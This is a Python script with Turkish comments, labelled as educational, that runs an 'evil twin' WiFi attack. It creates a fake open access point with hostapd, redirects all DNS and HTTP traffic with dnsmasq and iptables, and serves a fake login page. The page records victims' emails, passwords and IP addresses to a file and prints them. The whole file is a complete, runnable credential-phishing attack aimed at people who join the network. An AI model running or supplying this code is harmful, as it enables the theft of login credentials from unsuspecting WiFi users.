#!/usr/bin/env python3
"""
Evil Twin — Sahte WiFi Erişim Noktası (Eğitim Amaçlı)
=======================================================
Sahte bir WiFi ağı oluşturup bağlanan kullanıcıların
trafiğini dinler ve sahte bir login sayfası sunar.

GEREKSINIMLER (Linux):
  - hostapd, dnsmasq paketleri
  - Monitör modunu destekleyen WiFi adaptörü
  - Root yetkisi

Kurulum: sudo apt install hostapd dnsmasq
"""
import os
import sys
import subprocess
import signal
import time
import threading

try:
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    from urllib.parse import parse_qs
except ImportError:
    pass

# Sahte login sayfası HTML
CAPTIVE_HTML = """<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WiFi Giriş</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);
min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,0.1);
border-radius:20px;padding:40px;width:380px;text-align:center;color:#fff}
.card h2{margin-bottom:8px;font-size:22px}
.card p{color:rgba(255,255,255,0.6);font-size:13px;margin-bottom:25px}
input{width:100%;padding:14px 18px;margin:8px 0;border:1px solid rgba(255,255,255,0.15);
border-radius:12px;background:rgba(255,255,255,0.08);color:#fff;font-size:15px;outline:none}
input:focus{border-color:#6c63ff}
input::placeholder{color:rgba(255,255,255,0.35)}
button{width:100%;padding:14px;margin-top:15px;border:none;border-radius:12px;
background:linear-gradient(135deg,#6c63ff,#3b82f6);color:#fff;font-size:16px;
font-weight:600;cursor:pointer;transition:transform .2s}
button:hover{transform:scale(1.02)}
.logo{font-size:40px;margin-bottom:15px}
</style>
</head>
<body>
<div class="card">
<div class="logo">📶</div>
<h2>WiFi Bağlantısı</h2>
<p>İnternet erişimi için lütfen giriş yapın</p>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="E-posta veya Kullanıcı Adı" required>
<input type="password" name="password" placeholder="Şifre" required>
<button type="submit">Giriş Yap</button>
</form>
<p style="margin-top:18px;font-size:11px;color:rgba(255,255,255,0.3)">
Güvenli bağlantı • Şifreli iletişim</p>
</div>
</body>
</html>"""

REDIRECT_HTML = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Bağlanıyor...</title>
<style>body{background:#0f0c29;color:#fff;font-family:Arial;display:flex;
align-items:center;justify-content:center;min-height:100vh;text-align:center}
</style></head><body>
<div><h2>✅ Giriş Başarılı!</h2><p>İnternet bağlantınız kuruluyor...</p></div>
</body></html>"""

LOG_FILE = "captured_credentials.txt"

class CaptiveHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(CAPTIVE_HTML.encode())

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        params = parse_qs(body)
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]

        # Kimlik bilgilerini kaydet
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] IP: {self.client_address[0]} | Email: {email} | Pass: {password}\n"

        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(entry)

        print(f"\n  \033[91m[!] KİMLİK BİLGİSİ YAKALANDI!\033[0m")
        print(f"  \033[92m    Email : {email}\033[0m")
        print(f"  \033[92m    Pass  : {password}\033[0m")
        print(f"  \033[93m    IP    : {self.client_address[0]}\033[0m\n")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(REDIRECT_HTML.encode())

    def log_message(self, format, *args):
        pass  # HTTP loglarını sustur

def start_captive_portal(port=80):
    """Sahte login sayfası sunucusu başlat"""
    server = HTTPServer(('0.0.0.0', port), CaptiveHandler)
    print(f"  [+] Captive portal: http://0.0.0.0:{port}")
    server.serve_forever()

def setup_hostapd(iface, ssid, channel=6):
    """hostapd konfigürasyonu oluştur"""
    config = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""
    with open("/tmp/hostapd_evil.conf", 'w') as f:
        f.write(config)
    return "/tmp/hostapd_evil.conf"

def setup_dnsmasq(iface, gateway="10.0.0.1"):
    """dnsmasq konfigürasyonu — tüm DNS sorgularını kendimize yönlendir"""
    config = f"""interface={iface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/{gateway}
"""
    with open("/tmp/dnsmasq_evil.conf", 'w') as f:
        f.write(config)
    return "/tmp/dnsmasq_evil.conf"

def run_evil_twin(iface, ssid, channel=6):
    """Evil Twin saldırısını başlat"""
    gateway = "10.0.0.1"

    print(f"\n  [*] Arayüz     : {iface}")
    print(f"  [*] Sahte SSID : {ssid}")
    print(f"  [*] Kanal      : {channel}")
    print(f"  [*] Gateway    : {gateway}\n")

    # Monitör moda geç
    print("  [1/5] Arayüz hazırlanıyor...")
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "down"], capture_output=True)
    subprocess.run(["iwconfig", iface, "mode", "monitor"], capture_output=True)
    subprocess.run(["ip", "link", "set", iface, "up"], capture_output=True)

    # IP ata
    print("  [2/5] IP yapılandırması...")
    subprocess.run(["ip", "addr", "flush", "dev", iface], capture_output=True)
    subprocess.run(["ip", "addr", "add", f"{gateway}/24", "dev", iface], capture_output=True)

    # hostapd başlat
    print("  [3/5] Sahte AP başlatılıyor (hostapd)...")
    hostapd_conf = setup_hostapd(iface, ssid, channel)
    hostapd_proc = subprocess.Popen(["hostapd", hostapd_conf],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # dnsmasq başlat
    print("  [4/5] DHCP/DNS sunucusu başlatılıyor (dnsmasq)...")
    dnsmasq_conf = setup_dnsmasq(iface, gateway)
    dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf, "-d"],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # IP forwarding
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)

    # iptables — tüm HTTP trafiğini captive portal'a yönlendir
    subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp",
                     "--dport", "80", "-j", "DNAT", "--to-destination", f"{gateway}:80"],
                    capture_output=True)

    # Captive portal başlat
    print("  [5/5] Captive portal başlatılıyor...")
    portal_thread = threading.Thread(target=start_captive_portal, daemon=True)
    portal_thread.start()

    print(f"\n  \033[92m[+] EVIL TWIN AKTİF!\033[0m")
    print(f"  \033[92m[+] SSID: {ssid}\033[0m")
    print(f"  \033[93m[*] Kurbanlar bağlandığında kimlik bilgileri buraya düşecek.\033[0m")
    print(f"  \033[93m[*] Kayıt dosyası: {LOG_FILE}\033[0m")
    print(f"  \033[91m[*] Durdurmak için CTRL+C\033[0m\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n  [*] Kapatılıyor...")
        hostapd_proc.terminate()
        dnsmasq_proc.terminate()
        subprocess.run(["iptables", "-t", "nat", "-F"], capture_output=True)
        print("  [+] Evil Twin durduruldu.")

if __name__ == "__main__":
    if os.name == 'nt':
        print("[-] Evil Twin sadece Linux'ta çalışır.")
        print("[*] Gereksinimler: hostapd, dnsmasq, airmon-ng")
        print("[*] Monitör modu destekleyen WiFi adaptörü gereklidir.")
        sys.exit(1)

    if os.geteuid() != 0:
        print("[-] Root yetkisi gerekli! sudo ile çalıştırın.")
        sys.exit(1)

    if len(sys.argv) < 3:
        print("Kullanım: sudo python Evil_Twin.py <ARAYÜZ> <SAHTE_SSID> [KANAL]")
        print("Örnek  : sudo python Evil_Twin.py wlan0 FreeWiFi 6")
        sys.exit(1)

    iface = sys.argv[1]
    ssid = sys.argv[2]
    ch = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    run_evil_twin(iface, ssid, ch)
